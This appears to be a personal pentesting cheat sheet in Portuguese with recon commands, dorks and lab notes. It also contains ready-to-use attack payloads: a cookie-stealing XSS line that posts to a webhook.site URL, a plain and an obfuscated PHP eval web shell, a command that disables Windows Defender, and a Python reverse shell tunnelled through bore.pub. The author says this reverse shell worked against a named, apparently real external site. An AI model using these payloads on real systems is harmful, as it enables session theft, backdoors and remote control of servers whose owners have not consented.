# Umas paradas que uso de vez em quando e gosto de deixar salvo pra lembrar


### Extensões úteis para Browser
* `dotgit`
* `Wappalyzer`
* `Shodan`
* `FoxyProxy`
* `Cookie-Editor`
* `DNSlytics`
* `Retire-js`
* `Hack-Tools`
---
- find / -name user.txt 2>/dev/null
- grep --color=auto -rnw ‘/’ -ie “HTB” --color=always 2> /dev/null
- nuclei -tl | grep -i avada
- nuclei -u https://site -tags wordpress
- nuclei -tc "contains(to_lower(name), 'wordfence')" -u https://exemplo.com
- `nuclei -u targets -t /path/to/templates \
  -rl 5 -c 2 -bs 1 \
  -timeout 5 -retries 0 \
  -H "User-Agent: Mozilla/5.0" \
  -stats -silent`
- /auth.json
- wpscan --url https://exemplo.com --enumerate vp,vt,u,cb --api-token SEU_TOKEN --random-user-agent --force  --disable-tls-checks   --request-timeout 30
- "Vulnerability Disclosure Program" VDP "site:uk -bugbount -hackerone -intigriti -bugcrowd -yeswehack"
- Desativar AV `PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true`
- [Dorks Faisalahmed](https://dorks.faisalahmed.me/)
- https://github.com/navreet1425/CVE-2021-34621 cve pra testar -> /wp-admin/admin-ajax.php
- gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
- nmap -sU -p 53 --script=dns-nsid 10.129.2.48 (Verifica o servidor DNS (porta 53/UDP) por possíveis exposições de dados sensíveis.)
- nmap 10.129.4.84 -sV -D RND:2 -Pn -sS -sU --max-retries=2 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" -p-
- zaproxy testar mais
- subfinder -all -d alvo.com -recursive | httpx | nuclei -nmhe -t ./nuclei-templates/http/cves/(CVE)/CVE-2025-0133.yaml
- nuclei -t cves/ -u [http://alvo.com] -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
- nuclei -u [https://alvo.com]) -tags moodle
- ?_TSM_HiddenField_=jhbdvfkjhdfbvdfbv&_TSM_CombinedScripts_=1
- [SHCheck - Shell/Header Vulnerability Checker](https://github.com/santoru/shcheck)
- [Converter imagem em link pub](https://pngup.com/)
- <?php system($_GET['ted']);?> no user agent e depois ve se proca na url e etc
- busybox unzip arquivo.zip
- http://palined.com/search/  bom dork para pesquisar diretorios publicos de sites
- id_rsa é o que precisa no ssh, ele tem que esta no dir .ssh, com permissao 600 e com um espaçamento depois do fim da chave pra n dar erro de libcrypto. Precisa tambem usar por final o comando ssh-keygen -lf id_rsa. Depois apenas logar no ssh usando o : ssh -i id_rsa ceil@10.129.196.75
- reminna pra rdp no kali e outras coisas
- trufflehog git https://github.com/trufflesecurity/test_keys --results=verified            -> scan de um repositorio especifico em busca de secrets
- trufflehog github --org=trufflesecurity --results=verified       -> scan de um perfil github completo em busca de secrets
- https://web.archive.org/
- tool ReconSpider boa para crawling, pip3 install scrapy e depois wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip , unzip ReconSpider.zip , python3 ReconSpider.py http://inlanefreight.com
- git clone https://github.com/thewhiteh4t/FinalRecon.git
- <?php class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#£¤h*u@!hJ2v689U02*/".$H8Jy7."/*Z#£¤h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>

---
  
### Payload XSS Simples para Roubo de Cookies:
    <img src=x onerror="fetch('https://webhook.site/8a54464b-651a-4ae5-9d09-d19711774bd1',{method:'POST',body:'cookie='+document.cookie})">
### Bypass de filtro de iframe com xss onerror
```
<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
```
### Hostear arquivo sem a bomba do ngrok

- wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
- sudo dpkg -i cloudflared-linux-amd64.deb
- sudo apt -f install
- cloudflared --version

- abre o python3 -m http.server 3000 no dir que vc quer
- depois só rodar cloudflared tunnel --url http://localhost:3000 e ele vai te fornecer o link

### Sem usar a bomba do ngrok e a bomba do clouflare exemplo real que validei

- bore local 4444 --to bore.pub  # Ou bore tld (custom domínio)
- (ele vai fornecer algo como bore.pub:24966)
- nc -lvnp 4444  # Porta do bore local
- e depois o payload que funcionou pra mim `curl -X POST --data-urlencode "pass=system('python3 -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"bore.pub\\\",24966));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")\"');" https://pil.loyolavirtual.net/by.php`

---

# 🛡️ Disclaimer 

This repository was created **for educational and cybersecurity research purposes only**.  
The use of any information, scripts, or tools contained herein **is the sole responsibility of the user**.  
**I am not responsible for any misuse** or activity that violates local laws or third-party policies.


© [GSecurity]
